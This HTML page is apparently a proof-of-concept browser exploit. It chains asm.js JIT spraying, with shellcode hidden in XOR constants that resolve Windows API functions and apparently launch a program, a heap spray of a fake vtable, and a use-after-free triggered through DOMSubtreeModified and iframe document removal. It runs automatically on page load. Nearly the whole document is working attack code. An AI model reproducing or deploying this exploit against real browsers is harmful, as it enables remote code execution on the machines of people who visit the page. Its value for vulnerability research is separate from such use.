<!-- 
    Author : Hwiown Lee
    Email : develacker@gmail.com 
-->
<html>
    <script>
        var ShellStage = new (function () {

            function createModule(stdlib, ffi, heap) {
                "use asm";
                var tmp = ffi.tmp;

                function f(a) {
                    a = a|0;
                    
                    /* set eip = 0x21ff002c */
                    a = a ^ 0x21ff002c;
                    a = a ^ 0x21ff002c;
                    a = a ^ 0x21ff002c;
                    a = a ^ 0x21ff002c;
                    
                    /* now shellcode starts here */
                    a = a ^ 0x3c909090;
                    a = a ^ 0x3c90C033;
                    a = a ^ 0x3c9030b0;
                    a = a ^ 0x3c008b64;
                    a = a ^ 0x3c0c408b;
                    a = a ^ 0x3c1c408b;
                    a = a ^ 0x3c08508b;
                    a = a ^ 0x3c20788b;
                    a = a ^ 0x3c90008b;
                    a = a ^ 0x6a6d3f80;
                    a = a ^ 0x3c90eA75;
                    a = a ^ 0x3c904747;
                    a = a ^ 0x6a733f80;
                    a = a ^ 0x3c90ef75;
                    a = a ^ 0x3c904747;
                    a = a ^ 0x6a763f80;
                    a = a ^ 0x3c90ef75;
                    a = a ^ 0x3c904747;
                    a = a ^ 0x6a633f80;
                    a = a ^ 0x3c90ef75;
                    a = a ^ 0x3c529090;
                    a = a ^ 0x3c3cc283;
                    a = a ^ 0x3c903a8b;
                    a = a ^ 0x3c24148b;
                    a = a ^ 0x3c90d703;
                    a = a ^ 0x3c78c283;
                    a = a ^ 0x3c903a8b;
                    a = a ^ 0x3c24148b;
                    a = a ^ 0x3c90d703;
                    a = a ^ 0x3c18c283;
                    a = a ^ 0x3c903a8b;
                    a = a ^ 0x3c04c283;
                    a = a ^ 0x3c901a8b;
                    a = a ^ 0x3c241c03;
                    a = a ^ 0x3c04c283;
                    a = a ^ 0x3c90328b;
                    a = a ^ 0x3c243403;
                    a = a ^ 0x3c04c283;
                    a = a ^ 0x3c900a8b;
                    a = a ^ 0x3c240c03;
                    a = a ^ 0x3cb89090;
                    a = a ^ 0x3c900000;
                    a = a ^ 0x3c9065b0;
                    a = a ^ 0x3c906db4;
                    a = a ^ 0x3c905090;
                    a = a ^ 0x3cb89090;
                    a = a ^ 0x3c907473;
                    a = a ^ 0x3c9073b0;
                    a = a ^ 0x3c9079b4;
                    a = a ^ 0x3c905090;
                    a = a ^ 0x3c90d78b;
                    a = a ^ 0x3c90ff33;
                    a = a ^ 0x3c90C033;
                    a = a ^ 0x3c535156;
                    a = a ^ 0x14909090;
                    a = a ^ 0x3c909090;
                    a = a ^ 0x3c574790;
                    a = a ^ 0x3c90C033;
                    a = a ^ 0x3c24048b;
                    a = a ^ 0x3c02e0c1;
                    a = a ^ 0x3c90f003;
                    a = a ^ 0x3c90068b;
                    a = a ^ 0x3c18c483;
                    a = a ^ 0x3c240403;
                    a = a ^ 0x3c18ec83;
                    a = a ^ 0x3c90c933;
                    a = a ^ 0x3c9006b1;
                    a = a ^ 0x3c10c483;
                    a = a ^ 0x3c90f48b;
                    a = a ^ 0x3c90f88b;
                    a = a ^ 0x3c10c483;
                    a = a ^ 0x6a90a6f3;
                    a = a ^ 0x14901474;
                    a = a ^ 0x3c1cec83;
                    a = a ^ 0x3c595b5f;
                    a = a ^ 0x3c90905e;
                    a = a ^ 0x3c908beb;
                    a = a ^ 0x3c1cec83;
                    a = a ^ 0x3c595b5f;
                    a = a ^ 0x3c90905e;
                    a = a ^ 0x3c90e7d1;
                    a = a ^ 0x3c90cf03;
                    a = a ^ 0x3c90c033;
                    a = a ^ 0x3c018b66;
                    a = a ^ 0x3c02e0c1;
                    a = a ^ 0x3c90c303;
                    a = a ^ 0x3c90188b;
                    a = a ^ 0x3c08c483;
                    a = a ^ 0x3c241c03;
                    a = a ^ 0x646170B8;
                    a = a ^ 0x000000b9;
                    a = a ^ 0x3C50c12b;
                    a = a ^ 0x00B89090;
                    a = a ^ 0x3c906574;
                    a = a ^ 0x3c906fb4;
                    a = a ^ 0x3C506eb0;
                    a = a ^ 0x3cd3ff54;
                    a = a ^ 0x3ccccccc;

                    return a|0;
                }

                return f;
            }

            var fake_object = [];

            /*
                s -d 0x20000000 0x28000000 0x2222004e
                ...
                0x21feffa8
                ...
            */

            //Math.atan2(0x111, "Starting heap spray"); // for debug
            for (var i = 1; i < 0x5c / 4; i++)
                fake_object[i] = unescape("%u4141%u4141");
            fake_object[0] = unescape("%uffa8%u21fe");   // vtable

            var fill_freed = [];
            this.spray = () => {
                for (var i = 0; i < 0x1000; i++)
                    fill_freed.push(fake_object.join(""));
            };

            this.modules = [];
            var ab = new ArrayBuffer(0x100000);
            for (var i = 0; i < 10000; i++)
                this.modules[i] = createModule(window, {tmp: () => {}}, ab);

        })();


        function gc() {
            for (var i = 0; i < 0x10; i++)
                var g = new ArrayBuffer(0x1000000);
        }

        function main() {
            var f = document.createElement("iframe");
            document.body.appendChild(f);

            var doc = f.contentDocument;
            document.body.removeChild(f);

            doc.body.parentNode.removeChild(doc.body);

            var d = doc.createElement("div").appendChild(doc.createElement("div"));
            d.appendChild(doc.createElement("body"));

            var html = doc.documentElement;
            d.addEventListener("DOMSubtreeModified", function () {
            d.removeEventListener("DOMSubtreeModified", arguments.callee, false);

            for (var i = 0, n = html.childNodes.length; i < n; i++)
                html.removeChild(html.childNodes[0]);

            html.parentNode.removeChild(html);
            html = null;

            doc.appendChild(doc.createElement("html"));
            try {
                doc.body = doc.createElement("div");
            } catch (e) {
            }
            d.removeChild(d.childNodes[0]); // free

            gc();

            document.location.href = "javascript:ShellStage.spray(); document.location.href='http://google.com';";
            alert("hold on");
            }, false);

            doc.body = d.childNodes[0]; // re-use...Boom!!
        }
    </script>

    <body onload="main()">
    </body>

</html>